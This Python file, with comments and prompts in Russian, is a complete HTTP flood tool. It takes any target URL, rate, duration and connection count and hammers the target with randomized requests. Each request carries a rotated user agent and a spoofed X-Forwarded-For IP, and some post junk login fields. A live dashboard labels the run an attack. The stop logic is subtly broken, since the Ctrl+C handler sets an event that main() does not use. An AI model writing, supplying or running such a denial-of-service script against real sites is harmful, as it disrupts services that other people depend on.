import socket
import aiohttp
import asyncio
import random
import string
import time
import signal  # Импортируем signal для обработки Ctrl+C
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from rich.align import Align

# --- Конфигурация атаки ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
]


def generate_random_string(length=10):
    """Генерирует случайную строку."""
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(length))


def generate_random_ip():
    """Генерирует случайный IP-адрес."""
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"


# --- Основная логика атаки ---
async def flood(session, url, rps, duration, stats, stop_event):
    """
    Асинхронная функция, которая создает нагрузку.
    """
    start_time = time.time()
    interval = 1.0 / rps
    while time.time() - start_time < duration and not stop_event.is_set():
        request_start = time.time()
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "X-Forwarded-For": generate_random_ip(),
        }
        method = random.choice(["GET", "POST", "HEAD"])
        data = None
        if method == "POST":
            data = aiohttp.FormData({
                'user': generate_random_string(),
                'pass': generate_random_string(),
            })
        try:
            async with session.request(method, url, headers=headers, data=data, timeout=10) as response:
                await response.read()
                stats['total_requests'] += 1
                if response.status < 400:
                    stats['success_requests'] += 1
                elif response.status >= 500:
                    stats['server_errors'] += 1
                else:
                    stats['client_errors'] += 1
        except asyncio.TimeoutError:
            stats['timeouts'] += 1
        except aiohttp.ClientError:
            stats['connection_errors'] += 1
        except Exception:
            stats['other_errors'] += 1

        elapsed = time.time() - request_start
        sleep_time = interval - elapsed
        if sleep_time > 0:
            await asyncio.sleep(sleep_time)


def get_user_input(console: Console):
    """Получает параметры атаки от пользователя через интерактивный ввод."""
    console.print("[bold cyan]Настройка параметров стресс-теста[/bold cyan]")
    url = console.input("[bold magenta]1. Введите URL цели (например, http://127.0.0.1): [/bold magenta]")
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    rps_str = console.input("[bold magenta]2. Введите общий RPS (запросов/сек, например, 100): [/bold magenta]")
    rps = int(rps_str) if rps_str.isdigit() else 100
    duration_str = console.input(
        "[bold magenta]3. Введите длительность атаки (в секундах, например, 60): [/bold magenta]")
    duration = int(duration_str) if duration_str.isdigit() else 60
    connections_str = console.input(
        "[bold magenta]4. Введите кол-во одновременных подключений (например, 50): [/bold magenta]")
    connections = int(connections_str) if connections_str.isdigit() else 50
    return url, rps, duration, connections


def create_stats_table(stats, elapsed_time, rps_target):
    """Создает таблицу со статистикой."""
    table = Table(title="🔥 Статистика Атаки 🔥", show_header=True, header_style="bold magenta")
    table.add_column("Метрика", style="cyan", no_wrap=True)
    table.add_column("Значение", style="green")
    current_rps = stats['total_requests'] / elapsed_time if elapsed_time > 0 else 0
    table.add_row("Время работы", f"{elapsed_time:.2f} сек")
    table.add_row("Всего запросов", str(stats['total_requests']))
    table.add_row("Текущий RPS", f"{current_rps:.2f} / {rps_target}")
    table.add_row("Успешно (2xx)", str(stats['success_requests']))
    table.add_row("Ошибки сервера (5xx)", str(stats['server_errors']))
    table.add_row("Ошибки клиента (4xx)", str(stats['client_errors']))
    table.add_row("Таймауты", str(stats['timeouts']))
    table.add_row("Ошибки соединения", str(stats['connection_errors']))
    table.add_row("Прочие ошибки", str(stats['other_errors']))
    return table


# --- ДОПОЛНЕННАЯ ГЛАВНАЯ ФУНКЦИЯ ---
async def main():
    """Главная функция для запуска и координации атаки с GUI."""
    console = Console()

    # --- Этап 1: Получение параметров от пользователя ---
    url, rps, duration, connections = get_user_input(console)
    console.print("\n[bold green]Параметры установлены. Нажмите Enter для начала атаки...[/bold green]")
    input()

    # --- Этап 2: Подготовка и запуск атаки ---
    console.clear()
    stop_event = asyncio.Event()
    stats = {
        'total_requests': 0,
        'success_requests': 0,
        'server_errors': 0,
        'client_errors': 0,
        'timeouts': 0,
        'connection_errors': 0,
        'other_errors': 0,
    }

    # Создаем сессию и задачи
    # ИСПРАВЛЕНО: Используем socket.AF_INET вместо aiohttp.resolver.AF_INET
    connector = aiohttp.TCPConnector(force_close=True, limit=0, ssl=False, family=socket.AF_INET)
    timeout = aiohttp.ClientTimeout(total=15, connect=5)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        rps_per_connection = rps / connections
        tasks = []
        for _ in range(connections):
            task = asyncio.create_task(flood(session, url, rps_per_connection, duration, stats, stop_event))
            tasks.append(task)

        start_time = time.time()

        # --- Этап 3: Отображение GUI в реальном времени ---
        # Эта функция будет обновлять live-дисплей
        def update_display():
            elapsed_time = time.time() - start_time
            stats_table = create_stats_table(stats, elapsed_time, rps)

            info_panel = Panel(
                f"Цель: [bold yellow]{url}[/bold yellow]\n"
                f"Длительность: {duration} сек | Подключений: {connections}\n"
                f"[bold red]Нажмите Ctrl+C для преждевременной остановки[/bold red]",
                title="Информация", border_style="blue"
            )

            progress = Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeRemainingColumn(),
            )
            task_progress = progress.add_task("[green]Прогресс атаки...", total=duration)
            progress.update(task_progress, completed=min(elapsed_time, duration))

            # --- ЗАВЕРШЕНИЕ КОДА: Компоновка макета ---
            layout = Layout()
            layout.split_column(
                Layout(info_panel, size=5),
                Layout(stats_table, ratio=2),
                Layout(progress, size=8))
            # Оборачиваем итоговый макет в Align для центрирования
            return Align.center(layout)

        # Создаем Live-дисплей с функцией для обновления
        with Live(console=console, refresh_per_second=4, transient=False) as live:
            while not all(task.done() for task in tasks) and not stop_event.is_set():
                live.update(update_display())
                await asyncio.sleep(0.25) # Небольшая задержка для снижения нагрузки на CPU

        # --- Этап 4: Завершение и финальная статистика ---
        # Убедимся, что все задачи завершены (если атака не была остановлена)
        if not stop_event.is_set():
            await asyncio.gather(*tasks)

        # Выводим финальную статистику после завершения атаки
        console.clear()
        final_elapsed_time = time.time() - start_time
        final_stats_table = create_stats_table(stats, final_elapsed_time, rps)

        console.print(Align.center(final_stats_table))

        if stop_event.is_set():
            console.print("\n[bold red]Атака была преждевременно остановлена пользователем.[/bold red]")
        else:
            console.print(f"\n[bold green]Атака успешно завершена за {final_elapsed_time:.2f} секунд.[/bold green]")

# --- ДОБАВЛЕНО: Обработчик сигнала для graceful shutdown ---
def handle_shutdown(signum, frame):
    """Обрабатывает сигнал SIGINT (Ctrl+C) для остановки атаки."""
    print("\n[bold yellow]Получен сигнал остановки. Завершение атакующих задач...[/bold yellow]")
    # Устанавливаем событие, чтобы все корутины 'flood' завершились
    stop_event.set()

if __name__ == "__main__":
    # Создаем событие для остановки
    stop_event = asyncio.Event()

    # Регистрируем обработчик для Ctrl+C
    signal.signal(signal.SIGINT, handle_shutdown)

    # Запускаем основную асинхронную функцию
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        # Этот блок может сработать, если Ctrl+C нажать до запуска event loop
        print("\n[bold red]Программа прервана до запуска.[/bold red]")
